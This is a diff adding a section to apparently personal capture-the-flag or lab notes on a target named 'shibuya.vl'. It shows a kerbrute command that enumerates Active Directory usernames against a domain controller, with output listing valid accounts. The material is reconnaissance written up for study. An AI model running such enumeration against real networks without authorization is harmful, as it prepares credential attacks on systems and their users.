@@ -96,4 +96,26 @@ Not a lot i can do with SSH until i get credentials
 Null auth is enabled be default on domain controllers
 Guest account is disabled
 
+# Valid usernames found with kerbrute
+```python
+kerbrute userenum -d shibuya.vl --dc AWSJPDC0522.shibuya.vl /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 03/21/26 - Ronnie Flathers @ropnop
+
+2026/03/21 17:30:01 >  Using KDC(s):
+2026/03/21 17:30:01 >  	AWSJPDC0522.shibuya.vl:88
+
+2026/03/21 17:30:01 >  [+] VALID USERNAME:	 purple@shibuya.vl
+2026/03/21 17:30:02 >  [+] VALID USERNAME:	 red@shibuya.vl
+2026/03/21 17:30:14 >  [+] VALID USERNAME:	 Purple@shibuya.vl
+2026/03/21 17:30:22 >  [+] VALID USERNAME:	 Red@shibuya.vl
+2026/03/21 17:30:38 >  [+] VALID USERNAME:	 RED@shibuya.vl
+2026/03/21 17:30:38 >  [+] VALID USERNAME:	 PURPLE@shibuya.vl
+```
 
